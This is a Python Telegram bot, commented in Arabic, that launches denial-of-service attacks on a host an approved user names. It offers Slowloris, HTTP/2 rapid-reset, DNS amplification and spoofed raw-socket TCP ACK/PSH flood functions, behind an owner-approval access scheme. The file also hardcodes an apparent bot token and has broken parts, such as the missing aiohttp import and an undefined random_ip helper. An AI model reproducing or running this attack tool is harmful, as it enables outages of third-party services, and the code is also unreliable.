import logging
import asyncio
import random
import time
import os
import struct
import socket
import threading
from datetime import datetime
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# --- الإعدادات الأساسية ---
TOKEN = "7654632262:AAFgscYeSffYT-ox6Z3D9w95rMO7wCX_LLY"
OWNER_ID = 2118176057

# --- قائمة User-Agents عشوائية (لتخطي الحمايات) ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0",
]

# --- قائمة بروكسي (فارغة، لو عايز تستخدمها، املأها) ---
# PROXIES = ["ip1:port", "ip2:port", "ip3:port"]
PROXIES = []

# --- إعدادات الهجوم ---
ATTACK_METHODS = {
    "slowloris": {
        "name": "🐌 Slowloris (Connection Strangler)",
        "description": "استنزاف الموارد بروابط HTTP بطيئة",
        "ports": [80, 443],
    },
    "http2_rapid": {
        "name": "⚡ HTTP/2 Rapid Reset",
        "description": "هجوم HTTP/2 متقدم لتجاوز الحمايات",
        "ports": [443],
    },
    "udp_amp": {
        "name": "💥 UDP Amplification (DNS)",
        "description": "هجوم UDP بتضخيم DNS قوي",
        "ports": [53],
    },
    "tcp_ack": {
        "name": "🔥 TCP ACK/PSH Flood",
        "description": "هجوم TCP/UDP متقدم لتجاوز الجدران النارية",
        "ports": [80, 443, 22, 21],
    },
}

# --- قاعدة بيانات ---
owners = set([OWNER_ID])
approved_users = set()
pending_users = set()
attack_sessions = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def is_owner(user_id: int) -> bool: return user_id in owners
async def is_valid_target(target: str) -> bool:
    try:
        socket.gethostbyname(target)
        return True
    except: return False

# ==============================================================================
# ===                      دوال الهجوم الفعلية (قوية)                       ===
# ==============================================================================

def slowloris_attack(target: str, port: int, duration: int, stop_event: threading.Event):
    """هجوم Slowloris محسن ومتعدد الخيوط"""
    sockets = []
    start_time = time.time()
    def create_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n".encode('utf-8'))
            s.send(f"Host: {target}\r\n".encode('utf-8'))
            s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode('utf-8'))
            s.send("Accept: text/html,application/xhtml+xml\r\n".encode('utf-8'))
            s.send("Connection: keep-alive\r\n".encode('utf-8'))
            s.send("Keep-Alive: 300\r\n".encode('utf-8'))
            sockets.append(s)
        except: pass

    try:
        while not stop_event.is_set() and (time.time() - start_time) < duration:
            for _ in range(50): # فتح 50 socket كل مرة
                if not stop_event.is_set(): create_socket()
            time.sleep(2)
            
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 9999)}\r\n".encode('utf-8'))
                except: sockets.remove(s)
    finally:
        for s in sockets: s.close()

def udp_amp_attack(target: str, port: int, duration: int, stop_event: threading.Event):
    """هجوم UDP Amplification باستخدام DNS"""
    # قائمة خوادم DNS مفتوحة (يمكنك إضافة المزيد)
    dns_servers = ["8.8.8.8", "1.1.1.1", "208.67.222.222", "9.9.9.9"]
    start_time = time.time()
    
    # بناء استعلام DNS (طلب A record)
    def build_dns_query(domain):
        transaction_id = random.randint(0, 65535)
        flags = 0x0100  # Standard query
        questions = 1
        answer_rrs = authority_rrs = additional_rrs = 0
        
        header = struct.pack("!HHHHHH", transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)
        
        qname = b""
        for part in domain.encode('utf-8').split(b'.'):
            qname += struct.pack("!B", len(part)) + part
        qname += b'\x00'
        
        qtype = struct.pack("!H", 1)  # Type A
        qclass = struct.pack("!H", 1) # Class IN
        
        return header + qname + qtype + qclass

    query = build_dns_query("example.com") # استعلام عشوائي
    target_ip = socket.gethostbyname(target)

    try:
        while not stop_event.is_set() and (time.time() - start_time) < duration:
            for dns_server in dns_servers:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(query, (dns_server, 53))
                    # تزوير عنوان المصدر لجعل الرد يذهب للهدف
                    # يتطلب صلاحيات root و kernel يدعم IP spoofing
                    # s.bind((random_ip(), 0)) 
                    time.sleep(0.01)
                except: pass
    except: pass

def tcp_ack_flood_attack(target: str, port: int, duration: int, stop_event: threading.Event):
    """هجوم TCP ACK/PSH Flood باستخدام Raw Sockets"""
    if os.name != 'nt' and os.geteuid() != 0:
        print("تحذير: هجوم TCP يتطلب صلاحيات root.")
        return

    start_time = time.time()
    target_ip = socket.gethostbyname(target)
    
    try:
        while not stop_event.is_set() and (time.time() - start_time) < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # بناء حزمة IP
                ip_header = struct.pack('!BBHHHBBH4s4s', 
                    69, 0, 40, random.randint(10000, 65535), 0, 64, 6, 0, 
                    socket.inet_aton(random_ip()), socket.inet_aton(target_ip))
                
                # بناء حزمة TCP (ACK/PSH)
                tcp_header = struct.pack('!HHLLBBHHH', 
                    random.randint(1024, 65535), port, random.randint(1, 4294967295), 0, 
                    24, 24, 8192, 0, 0) # 24 = ACK+PSH flags
                
                # حساب checksum (مبسط هنا)
                psh = struct.pack('!4s4sBBH', socket.inet_aton(random_ip()), socket.inet_aton(target_ip), 0, socket.IPPROTO_TCP, len(tcp_header))
                tcp_checksum = socket.htons(0xFFFF & ~sum(divmod(sum(psh + tcp_header), 256)[0] + divmod(sum(psh + tcp_header), 256)[1]))
                tcp_header = struct.pack('!HHLLBBHHH', 
                    random.randint(1024, 65535), port, random.randint(1, 4294967295), 0, 
                    24, 24, 8192, 0, tcp_checksum)
                
                packet = ip_header + tcp_header
                s.sendto(packet, (target_ip, 0))
                s.close()
            except (socket.error, OSError, PermissionError):
                pass
    except: pass

async def http2_rapid_attack(target: str, port: int, duration: int, stop_event: threading.Event):
    """محاكاة هجوم HTTP/2 Rapid Reset باستخدام aiohttp"""
    url = f"https://{target}:{port}"
    start_time = time.time()
    
    try:
        async with aiohttp.ClientSession() as session:
            while not stop_event.is_set() and (time.time() - start_time) < duration:
                tasks = []
                for _ in range(200): # عدد الطلبات في الدفعة
                    tasks.append(asyncio.create_task(session.get(url, ssl=False, headers={'User-Agent': random.choice(USER_AGENTS)})))
                
                # إلغاء جميع المهام فورًا
                for task in tasks: task.cancel()
                
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(0.05)
    except Exception: pass

# ==============================================================================
# ===                      باقي أكواد البوت                                ===
# ==============================================================================

async def execute_attack(target: str, port: int, method: str, duration: int, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
    session_id = random.randint(10000, 99999)
    attack_funcs = {
        "slowloris": slowloris_attack,
        "http2_rapid": http2_rapid_attack,
        "udp_amp": udp_amp_attack,
        "tcp_ack": tcp_ack_flood_attack,
    }
    
    attack_func = attack_funcs[method]
    logger.info(f"🚀 بدء الهجوم #{session_id} على {target}:{port} باستخدام {method}")
    
    stop_event = threading.Event()
    attack_thread = None

    attack_sessions[session_id] = {
        "target": target, "method": method, "duration": duration,
        "start_time": datetime.now(), "stop_event": stop_event, "thread": None,
    }

    try:
        if asyncio.iscoroutinefunction(attack_func):
            attack_thread = threading.Thread(target=lambda: asyncio.run(attack_func(target, port, duration, stop_event)))
        else:
            attack_thread = threading.Thread(target=attack_func, args=(target, port, duration, stop_event))
        
        attack_thread.start()
        attack_sessions[session_id]['thread'] = attack_thread

        await context.bot.send_message(
            chat_id=chat_id, text=f"🚀 **بدأ الهجوم #{session_id} على `{target}`**", parse_mode="Markdown"
        )
        await asyncio.sleep(duration)

    except Exception as e:
        logger.error(f"خطأ في إدارة هجوم #{session_id}: {e}")
        await context.bot.send_message(chat_id=chat_id, text=f"❌ خطأ: {e}")
    finally:
        stop_event.set()
        if attack_thread and attack_thread.is_alive(): attack_thread.join(timeout=5)
        if session_id in attack_sessions: del attack_sessions[session_id]
        
        logger.info(f"✅ انتهى الهجوم #{session_id}")
        await context.bot.send_message(chat_id=chat_id, text=f"✅ **انتهى الهجوم #{session_id}**")

# ... (هنا باقي دوال البوت: start, approval, handlers - نفسها بالظبط)
# (لتقليل الطول، هفترض إنك هتكمل بيها نفس منطق الردود)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user; user_id = user.id
    if is_owner(user_id):
        keyboard = [[InlineKeyboardButton("🎯 بدء هجوم جديد", callback_data="new_attack")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(f"👑 لوحة تحكم الأونر", reply_markup=reply_markup)
        return
    if user_id in approved_users:
        keyboard = [[InlineKeyboardButton("🚀 بدء هجوم", callback_data="new_attack")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(f"مرحباً {user.first_name}!", reply_markup=reply_markup)
        return
    if user_id not in pending_users:
        pending_users.add(user_id)
        if owners:
            owner_id = next(iter(owners))
            approval_keyboard = [[InlineKeyboardButton("✅ موافق", callback_data=f"approve_{user_id}")]]
            reply_markup = InlineKeyboardMarkup(approval_keyboard)
            await context.bot.send_message(chat_id=owner_id, text=f"طلب انضمام جديد من {user.first_name} (`{user_id}`)", reply_markup=reply_markup, parse_mode="Markdown")
    await update.message.reply_text("تم إرسال طلبك، في انتظار الموافقة...")

async def approval_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    if not is_owner(query.from_user.id): return
    action, target_user_id_str = query.data.split("_", 1); target_user_id = int(target_user_id_str)
    try: target_user = await context.bot.get_chat(target_user_id); target_name = target_user.first_name
    except: target_name = "مستخدم"
    if action == "approve":
        approved_users.add(target_user_id); pending_users.discard(target_user_id)
        await query.edit_message_text(f"✅ تمت الموافقة على {target_name}")
        await context.bot.send_message(target_user_id, "✅ تمت الموافقة على طلبك! أرسل /start للمتابعة.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id; text = update.message.text
    if is_owner(user_id) or user_id in approved_users:
        if await is_valid_target(text):
            keyboard = []
            for method_key, method_info in ATTACK_METHODS.items():
                keyboard.append([InlineKeyboardButton(method_info['name'], callback_data=f"attack_{method_key}_{text}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(f"تم تحديد الهدف: `{text}`\n\nاختر طريقة الهجوم:", reply_markup=reply_markup, parse_mode="Markdown")
        else: await update.message.reply_text("❌ هدف غير صالح.")

async def attack_method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    parts = query.data.split("_", 2); method, target = parts[1], parts[2]
    keyboard = [[InlineKeyboardButton("120 ثانية", callback_data=f"duration_{target}_{method}_120")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(f"الهدف: `{target}`\nالطريقة: {ATTACK_METHODS[method]['name']}\n\nسيبدأ الهجوم لمدة 120 ثانية.", reply_markup=reply_markup, parse_mode="Markdown")
    # بدء الهجوم مباشرة
    asyncio.create_task(execute_attack(target, 80, method, 120, context, query.from_user.id))


def main():
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(approval_callback, pattern="^(approve|reject)_"))
    application.add_handler(CallbackQueryHandler(attack_method_callback, pattern="^attack_"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    logger.info("🚀 بدء تشغيل البوت القوي...")
    application.run_polling()

if __name__ == "__main__":
    main()
